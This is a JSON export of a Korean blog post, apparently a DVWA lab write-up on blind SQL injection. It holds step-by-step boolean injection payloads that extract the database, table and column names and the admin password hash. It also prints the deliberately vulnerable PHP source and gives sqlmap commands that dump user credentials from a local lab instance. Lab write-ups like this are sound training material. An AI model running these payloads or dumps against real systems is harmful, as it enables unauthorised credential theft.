@@ -1,0 +1,1068 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "9bc59143-4007-5bec-bc85-fb1098784e26",
+  "kind": "posts",
+  "title": "[DVWA] Blind SQL Injection",
+  "slug": "tistory-17",
+  "description": "1.Blind SQL InjectionBlind SQL Injection 취약점은 SQL 쿼리문이 성공했는지 판별하는 것으로 시작해 데이터를 대입해서 정보를 찾는 취약점이다.DVWA에서 Blind SQL Injection을 알아보자 2. 문제 DVWA 웹 사이트에서 유저 아이디를 입력하면 아이디가 존재하는지 출력하는 기능을 구현해 뒀다.존재하는 아이디를 입력하면 id exists in the database, 없으면 id is MISSING from the database를 출력한다. SQL Injection과 마찬가지로 userid값을 입력받는다. 이때 1' or 1=1 #를 입력하면 id exists in the database가 뜨게 된다. 이제 admin에 대한 패스워드를 찾아보자. 데이터베이..",
+  "category": "Wargame / DVWA",
+  "date": "2025-12-31",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2025-12-31T03:01:25+09:00",
+  "updatedAt": "2026-01-20T13:26:40+09:00",
+  "sourceDigest": "24f210ae9ce6e192d9d80f1572a819a6b120cb6b5c4988bf2e8295ba1e31c538",
+  "assets": [
+    {
+      "id": "911b192f-058c-5c01-8c6c-0060b0ce1ae5",
+      "name": "tistory-17-911b192f-058c-5c01-8c6c-0060b0ce1ae5.png",
+      "type": "image/png",
+      "path": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/911b192f-058c-5c01-8c6c-0060b0ce1ae5.png",
+      "sha": "a9f04382883eb644f3a5b4b4baf0e7f9efa0f51a"
+    },
+    {
+      "id": "88341c11-67f1-5b1e-a517-cca2013e2667",
+      "name": "tistory-17-88341c11-67f1-5b1e-a517-cca2013e2667.png",
+      "type": "image/png",
+      "path": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/88341c11-67f1-5b1e-a517-cca2013e2667.png",
+      "sha": "e77b0d6b021b2fd8a8962b97106e431d8eaf052e"
+    },
+    {
+      "id": "a3af8b04-b236-5f7f-a61c-f54ed2dbed56",
+      "name": "tistory-17-a3af8b04-b236-5f7f-a61c-f54ed2dbed56.png",
+      "type": "image/png",
+      "path": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/a3af8b04-b236-5f7f-a61c-f54ed2dbed56.png",
+      "sha": "ede85f7f256e48e0354175f33193827355bb8f2c"
+    },
+    {
+      "id": "195ac6e6-d417-522b-bc67-9a9843830746",
+      "name": "tistory-17-195ac6e6-d417-522b-bc67-9a9843830746.png",
+      "type": "image/png",
+      "path": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/195ac6e6-d417-522b-bc67-9a9843830746.png",
+      "sha": "35dc3d46c6d0afa0832652b9c6e5bda7facfeece"
+    },
+    {
+      "id": "27699bd8-77a8-5727-9e10-15023946f77d",
+      "name": "tistory-17-27699bd8-77a8-5727-9e10-15023946f77d.png",
+      "type": "image/png",
+      "path": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/27699bd8-77a8-5727-9e10-15023946f77d.png",
+      "sha": "cc75175338c540da9aedf1fe7868057169a2f470"
+    },
+    {
+      "id": "56dcf89b-d20b-5d7a-b99b-3e5d97a94129",
+      "name": "tistory-17-56dcf89b-d20b-5d7a-b99b-3e5d97a94129.png",
+      "type": "image/png",
+      "path": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/56dcf89b-d20b-5d7a-b99b-3e5d97a94129.png",
+      "sha": "1ed8583d74ee8857b0f920c8bb07fedbf8c275c5"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "911b192f-058c-5c01-8c6c-0060b0ce1ae5",
+          "src": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/911b192f-058c-5c01-8c6c-0060b0ce1ae5.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1.Blind SQL Injection"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Blind SQL Injection 취약점은 SQL 쿼리문이 성공했는지 판별하는 것으로 시작해 데이터를 대입해서 정보를 찾는 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DVWA에서 Blind SQL Injection을 알아보자"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 문제"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "88341c11-67f1-5b1e-a517-cca2013e2667",
+          "src": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/88341c11-67f1-5b1e-a517-cca2013e2667.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DVWA 웹 사이트에서 유저 아이디를 입력하면 아이디가 존재하는지 출력하는 기능을 구현해 뒀다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "존재하는 아이디를 입력하면 id exists in the database, 없으면  id is MISSING from the database를 출력한다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "a3af8b04-b236-5f7f-a61c-f54ed2dbed56",
+          "src": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/a3af8b04-b236-5f7f-a61c-f54ed2dbed56.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "195ac6e6-d417-522b-bc67-9a9843830746",
+          "src": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/195ac6e6-d417-522b-bc67-9a9843830746.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "SQL Injection과 마찬가지로 userid값을 입력받는다. 이때 1' or 1=1 #를 입력하면 id exists in the database가 뜨게 된다. "
+          },
+          {
+            "type": "hardBreak"
+          },
+          {
+            "type": "text",
+            "text": "이제 admin에 대한 패스워드를 찾아보자."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 4
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "데이터베이스 이름 찾기"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "먼저 length() 함수를 사용해 데이터베이스의 이름의 길이를 찾는다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND length(database()) = 4 #"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "만약 DB 이름이 'dvwa'(4글자)라면 조건이 참이 되어 \"User ID exists...\"가 출력된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "DB이름 길이가 4이므로 id exists in the database가 뜬다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그다음에 substr() 또는 substring() 함수를 사용하여 한 글자씩 잘라 비교한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "첫 번째 글자 확인:"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND substr(database(), 1, 1) = 'd' #"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이렇게 4개를 전부 유추할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "+아스키(ASCII) 코드 활용 (Binary Search): 문자를 직접 대입하는 것보다 숫자로 변환하여 범위를 좁히는 것이 효율적이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND ascii(substr(database(), 1, 1)) > 97 #"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "이진 탐색(Binary Search) 알고리즘을 적용하여 범위를 좁혀 나간다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "low level에 구현된 소스코드는 아래와 같으며 get요청이 들어오면 id 값을 query변수에 넣고 데이터 베이스에 쿼리문으로 작성한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\nif( isset( $_GET[ 'Submit' ] ) ) {\n    // Get input\n    $id = $_GET[ 'id' ];\n\n    // Check database\n    $getid  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $getid ); // Removed 'or die' to suppress mysql errors\n\n    // Get results\n    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors\n    if( $num > 0 ) {\n        // Feedback for end user\n        echo '<pre>User ID exists in the database.</pre>';\n    }\n    else {\n        // User wasn't found, so the page wasn't!\n        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );\n\n        // Feedback for end user\n        echo '<pre>User ID is MISSING from the database.</pre>';\n    }\n\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "지금까지의 공격으로 다음 정보를 획득했다고 가정한다."
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "attrs": {
+          "start": 1
+        },
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "DB 이름:",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": " dvwa"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 4
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "테이블 이름 찾기"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "마찬가지로 데이터베이스 이름을 찾았으니 첫 번째 테이블 이름의 길이를 다음과 같이 가져오고"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND (SELECT length(table_name) FROM information_schema.tables WHERE table_schema = database() LIMIT 0, 1) = 9 #"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "아래 코드와 같이 참과 거짓으로 자리에 맞는 문자열을 찾는다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND substr((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0, 1), 1, 1) = 'g' #"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "지금까지의 공격으로 다음 정보를 획득했다고 가정한다."
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "attrs": {
+          "start": 1
+        },
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "DB 이름:",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": " dvwa"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "테이블 이름:",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": " users"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 4
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "컬럼 이름 찾기"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "테이블 이름을 찾았으니 칼럼 이름 길이를 찾아보면 아래처럼 sql query가 짜지고 이걸 자리에 맞는 문자열을 찾으면 칼럼 이름들을 찾을 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND (SELECT length(column_name) FROM information_schema.columns WHERE table_name = 'users' LIMIT 0, 1) = 7 #"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "테이블 자리 문자열 찾기"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 0, 1), 1, 1)) > 97 #"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "지금까지의 공격으로 다음 정보를 획득했다고 가정한다."
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "attrs": {
+          "start": 1
+        },
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "DB 이름:",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": " dvwa"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "테이블 이름:",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": " users"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "컬럼 이름:",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": " user, password"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 4
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "중요 데이터 찾기"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이제 공격 시나리오는 user 칼럼의 값이 'admin'인 행(row)을 찾아서, 그 행의 password 값을 알아내는 것이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "admin 비밀번호가 MD5 해시(Hash) 형태로 저장된 지 확인하는 과정이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND (SELECT length(password) FROM users WHERE user = 'admin') = 32 #\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이제 32글자의 해시값을 첫 번째 글자부터 마지막 글자까지 추출한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1' AND ascii(substr((SELECT password FROM users WHERE user = 'admin'), 1, 1)) > 50 #"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "5f4dcc3b5aa765d61d8327deb882cf99로 해시 디코드를 해보면 password인 것을 알 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. SQLMAP으로 자동화"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "bash에 sqlmap을 설치하고 아래와 같은 명령어를 입력하면 자동으로 sqlmap에서 위에 공격을 실행한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "bash"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "sqlmap -u \"http://[DVWA_IP]/vulnerabilities/sqli_blind/?id=1&Submit=Submit\" \\\n       --cookie=\"security=low; PHPSESSID=[세션ID]\" \\\n       --dbs"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "27699bd8-77a8-5727-9e10-15023946f77d",
+          "src": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/27699bd8-77a8-5727-9e10-15023946f77d.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "dvwa 데이터베이스 안에 어떤 테이블들이 있는지 확인하는 명령어이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "sqlmap -u \"http://10.0.2.2:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=[세션ID]; security=low\" -D dvwa --tables\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "users 테이블에 있는 컬럼(속성) 정보를 확인하는 명령어이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "sqlmap -u \"http://10.0.2.2:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=[세션ID]; security=low\" -D dvwa -T users --columns\n"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "-T users",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": ": 대상 테이블을 users로 지정한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "--columns",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": ": 해당 테이블의 컬럼 이름과 데이터 타입 정보를 가져온다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이제 ID와 비밀번호 데이터를 뽑으려면 마지막에 --dump를 붙입니다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "sqlmap -u \"http://10.0.2.2:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=[세션ID]; security=low\" -D dvwa -T users -C user,password --dump\n"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "-C user,password",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": ": user 칼럼과 password 칼럼만 골라서 가져온다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "--dump",
+                    "marks": [
+                      {
+                        "type": "bold"
+                      }
+                    ]
+                  },
+                  {
+                    "type": "text",
+                    "text": ": 데이터를 덤프(추출)해서 화면에 보여준다"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "56dcf89b-d20b-5d7a-b99b-3e5d97a94129",
+          "src": "/assets/uploads/9bc59143-4007-5bec-bc85-fb1098784e26/56dcf89b-d20b-5d7a-b99b-3e5d97a94129.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "결과로 아래와 테이블을 얻을 수 있다. 위에서 얻은 admin의 password랑 똑같은 것을 알 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 3줄 요약"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "SQL의 참과 거짓이 보이면 취약점이 발생한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "substring과 length으로 직접 손으로 찾을 수 있다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "sqlmap을 사용하면 금방한다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph"
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/17",
+    "originalId": "17",
+    "publishedAt": "2025-12-31T03:01:25+09:00",
+    "updatedAt": "2026-01-20T13:26:40+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
